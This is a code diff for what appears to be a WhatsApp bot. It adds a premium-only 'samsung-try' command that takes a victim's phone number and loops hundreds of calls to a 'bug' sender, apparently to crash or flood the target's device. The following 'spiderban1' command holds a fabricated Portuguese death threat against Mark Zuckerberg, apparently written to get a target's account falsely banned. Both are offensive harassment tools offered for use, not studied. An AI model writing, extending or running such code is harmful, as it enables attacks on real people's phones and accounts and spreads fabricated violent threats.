@@ -1368,6 +1368,53 @@ if (!isPremium) return reply('_</> Can only be used by premium users..._')
   );
 }
 break;
+case 'samsung-try': {
+if (!isPremium) return reply(mess.premium)
+if (!q) return reply(`use .${command} 2547392784527`)
+let bijipler = q.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return reply(`<!>The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : .${command} 6287392784527`)
+let target = bijipler + '@s.whatsapp.net'
+await reply(`wait for the magic`)
+for (let j = 0; j < 50; j++) {
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+await ngeloc(target, m)
+}
+await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
+}
+break
 case "spiderban1":{
 if (!isPremium) return reply(`You are not a premium user sir 🚫`)
 const mtban1 = `Olá, sou Ditzz Zuckerberg, sou um terrorista da Indonésia, vou te matar nos Estados Unidos (EUA), mirando na sua cabeça Mark Zuckerberg 👿, se você não quer ser morto então você você tem que entrar em contato comigo pelo aplicativo WhatsApp 🔪👇
